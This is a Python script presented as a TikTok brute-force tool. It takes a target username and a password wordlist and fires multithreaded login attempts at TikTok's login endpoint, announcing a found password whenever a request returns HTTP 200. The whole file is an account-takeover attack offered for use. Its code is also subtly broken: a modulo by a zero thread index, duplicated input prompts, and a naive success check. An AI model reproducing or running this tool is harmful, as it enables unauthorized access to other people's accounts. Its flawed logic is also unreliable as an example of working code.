import requests
from subprocess import call
from colorama import Fore, Style, init
import threading

init()

red = Fore.LIGHTRED_EX
blue = Fore.LIGHTBLUE_EX
reset = Style.RESET_ALL
green = Fore.LIGHTGREEN_EX
yellow = Fore.YELLOW
magenta = Fore.LIGHTMAGENTA_EX

print("""⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣀⠀⠀⠀⠀⣀⣀⠀⠀⠀⠀⢀⣼⣷⣦⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣩⠙⢷⣦⠀⣴⣿⣿⠃⢀⣄⢠⡞⠉⠝⠩⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⢫⣿⢷⣾⣿⢛⣿⣿⠁⠀⠈⢹⠋⢠⣤⠀⣰⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢾⡀⠙⠻⣥⡾⠟⣻⡿⣥⡙⣷⢤⣴⣿⣶⣄⠁⣴⣃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⠈⠙⢾⣏⣱⣿⣻⣷⣴⣿⣿⣿⣿⠟⠁⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡼⠀⢀⣀⠀⠀⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡎⡀⢀⣾⣽⡷⣄⡀⠀⠀⠙⠻⣿⣿⣿⣿⣾⣟⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣯⠟⢁⡵⠞⢾⣟⣿⣿⣻⣦⣄⠀⠀⠈⠙⢿⣿⣿⣿⣿⣧⡀⠙⠳⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣠⣴⣺⠽⠚⢉⣠⣶⠏⣳⠾⢃⣿⣿⣡⡟⢧⠾⠷⣦⣤⣶⣿⢾⣿⣿⣿⣿⣿⣦⣄⣨⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣤⣶⠿⠛⢉⣠⣴⠞⢩⡾⠃⣼⠛⢠⡟⢉⣼⠟⢷⣾⣶⣾⠿⠿⢿⣥⣾⣿⣷⡝⠿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⣀⠀⠀⠀⠀⠀⠀
⢸⠻⠋⣡⣴⡾⢉⡶⠇⣰⠟⢁⡬⠁⢠⠇⢀⢸⣿⣦⣀⣿⡯⢠⢾⣿⣶⡦⢿⣿⠋⣠⠶⠈⣹⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⢹⣷⣤⡀⠀⠀⠀
⠸⡄⠸⣯⡇⢰⠾⢁⣤⠋⢠⡎⠀⠴⢂⣤⠞⢋⣠⣤⠿⢯⡀⡏⣾⣿⠋⠀⠀⠈⠓⠦⣄⠻⣭⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣻⢿⣇⡙⢶⣄⠀
⢠⣽⣦⡈⠙⢾⣀⡌⠁⠴⠆⢀⡼⠟⢋⣤⣾⠟⠉⠀⠀⠀⠙⣿⣿⡏⠀⠀⠀⠀⠀⠀⢸⠀⠬⠙⢿⣏⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣁⠀⠙⠀
⠈⠻⣿⣿⣦⡀⠉⠳⣼⡧⠞⢋⣤⣴⠿⠋⠀⠀⠀⠀⠀⠀⠀⠈⠻⣝⢦⣀⠀⠀⠀⣠⠞⢀⡴⠛⠳⢿⣿⣹⣄⠈⠻⢿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠙⢿⣿⣦⣀⠀⢀⣴⡿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠮⣝⠒⠮⠅⣰⠋⠀⠀⠀⠀⠉⠳⢌⡑⢦⡀⠉⠻⣿⣿⣿⣿⠏⠀⠀⠀
⠀⠀⠀⠀⠀⠙⢿⣿⣷⣾⣏⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⢦⣴⠃⣀⡀⠀⠀⠀⠀⠀⠀⠙⠲⣌⡓⢤⡀⣹⠟⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠉⠉⠁⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠒⠒⠛⠒⠒⠒⠒⠚⠛⠛⠚⠛⠛⠛⠛⠛⠛⠛⠓""")

print(" ________________________________________________________________")

print()

print("              SPECTRUM - BRUTE FORCE TOOL OF TIKTOK")


print()

print("               https://github.com/sk-k1ng/spectrum" + reset)

print(" ________________________________________________________________")

print()
print()
print()

adv = yellow + "[+]" + magenta

call(["clear"])

print()
print()
print()

print(blue + " > DO NOT ADD THE '@'")
user = input(yellow + " > user: " + reset)

print()

print(blue, "> IT MUST BE IN THIS DIRECTORY OR USE THE DEFAULT 'wordlist.txt'")
wordlist = input(yellow + " > wordlist: " + reset)

print()

print(blue, "> WHAT NUMBER SHOULD THE WORDLIST START AT?")
start_point = input(blue + " > Enter the starting point in the wordlist (e.g., 0 for the beginning): " + reset)

try:
    start_point = int(start_point)
except ValueError:
    print(red + "Invalid input. Defaulting to the beginning of the wordlist." + reset)
    start_point = 0

i = input(yellow + " > #: " + reset)
password = None

progress_interval = 500  # Adjust this interval based on your preference

def brute_force_worker(user, wordlist, start_point, index):
    global password

    with open(wordlist, 'r') as f:
        words = f.readlines()

    for i in range(start_point, len(words)):
        if i % index == 0:  # Only process words that match the thread index
            word = words[i].strip()
            if (i + 1) % progress_interval == 0:
                print(adv, f"Thread {index} cracking account...", f"{i + 1}/{len(words)}", reset)
            try: 
                response = requests.post('https://www.tiktok.com/node/login_v2/index', json={
                    "username": user,
                    "password": word,
                    "mix_mode": True,
                    "captcha": "",
                    "email": "",
                    "mobile": "",
                    "account": "",
                    "type": 1,
                    "app_id": 1233,
                    "device_id": "",
                    "iid": "",
                    "os_version": "",
                    "channel": "",
                    "device_platform": "",
                    "request_id": "",
                    "captcha_app": "",
                    "captcha_type": "",
                    "google_account": "",
                    "google_captcha": "",
                    "google_token": "",
                    "fb_account": "",
                    "fb_code": "",
                    "fb_token": "",
                    "apple_id": "",
                    "apple_token": "",
                    "apple_email": "",
                    "apple_code": "",
                    "mix_string": word
                })
                if response.status_code == 200:
                    password = word
                    print()
                    print(green + f" success! password is {word}" + reset)
                    return
            except Exception as e:
                print()
                print(red + f"Error: {e}. Pausing for user input..." + reset)
                input("Press Enter to resume...")

def brute_force_parallel(user, wordlist, start_point, num_threads=4):
    global password

    call(["clear"])

    threads = []
    for i in range(num_threads):
        thread = threading.Thread(target=brute_force_worker, args=(user, wordlist, start_point, i))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

user, password, wordlist, start_point = input(yellow + " > user: " + reset), None, input(yellow + " > wordlist: " + reset), input(blue + " > Enter the starting point in the wordlist (e.g., 0 for the beginning): " + reset)

try:
    start_point = int(start_point)
except ValueError:
    print(red + "Invalid input. Defaulting to the beginning of the wordlist." + reset)
    start_point = 0

brute_force_parallel(user, wordlist, start_point)
